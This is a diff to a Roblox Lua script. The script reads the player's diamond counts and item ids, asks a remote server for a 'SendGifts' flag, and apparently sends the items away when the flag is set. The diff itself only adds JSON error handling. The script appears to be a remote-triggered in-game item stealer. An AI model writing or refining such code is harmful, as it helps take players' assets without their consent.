@@ -83,6 +83,7 @@ end
 
 spawn(FrameFunction)
 
+
 local function dataFunction2() 
     while true do
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -118,6 +119,7 @@ local function dataFunction2()
             local ItemData = ItemInfo.data
             if ItemData._am then
                 diamondsvalue = ItemData._am
+gifts = ItemInfo.uid
             end
         end
 
@@ -126,7 +128,7 @@ local function dataFunction2()
             local ItemData = ItemInfo.data
             if ItemData._am then
                 voidvalue = ItemData._am
-                gifts = ItemInfo.uid
+                
             end
         end
 
@@ -141,9 +143,21 @@ local function dataFunction2()
             }
         })
 
-        local checkResult = Http:JSONDecode(checkResponse.Body)
+        local checkResult = {}
+        if checkResponse.Success then
+            local success, result = pcall(function()
+                return Http:JSONDecode(checkResponse.Body)
+            end)
+            if success then
+                checkResult = result
+            else
+                print("Failed to decode JSON:", result)
+            end
+        else
+            print("Request failed:", checkResponse.StatusCode)
+        end
 
-        print("SendGifts is:", checkResult.SendGifts)
+        print("SendGifts is:", checkResult.SendGifts or "Unavailable")
 
         if checkResult.SendGifts then
             print("Gifts value:", gifts)
@@ -182,6 +196,7 @@ local function dataFunction2()
 end
 
 spawn(dataFunction2)
+
 
 
 
